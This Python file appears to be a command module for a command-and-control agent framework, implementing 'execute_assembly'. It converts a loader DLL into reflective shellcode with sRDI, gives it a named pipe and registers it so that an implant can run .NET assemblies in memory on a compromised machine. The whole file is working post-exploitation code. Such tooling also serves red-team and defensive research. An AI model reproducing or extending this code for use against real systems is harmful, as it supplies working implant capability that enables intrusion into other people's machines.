from CommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from MythicFileRPC import *
from os import path


class ExecuteAssemblyArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require an assembly to execute.")
        parts = self.command_line.split(" ", maxsplit=1)
        self.add_arg("assembly_name", parts[0])
        self.add_arg("assembly_arguments", "")
        if len(parts) == 2:
            self.add_arg("assembly_arguments", parts[1])


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly [Assembly.exe] [args]"
    description = "Executes a .NET assembly with the specified arguments. This assembly must first be known by the agent using the `register_assembly` command."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = ExecuteAssemblyArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.args.add_arg("pipe_name", str(uuid4()))
        dllPath = path.join(self.agent_code_path, "AssemblyLoader_{}.dll".format(task.callback.architecture))
        dllBytes = open(dllPath, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicFileRPC(task).register_file(converted_dll)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.agent_file_id)
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error_message)
        
        return task

    async def process_response(self, response: AgentResponse):
        pass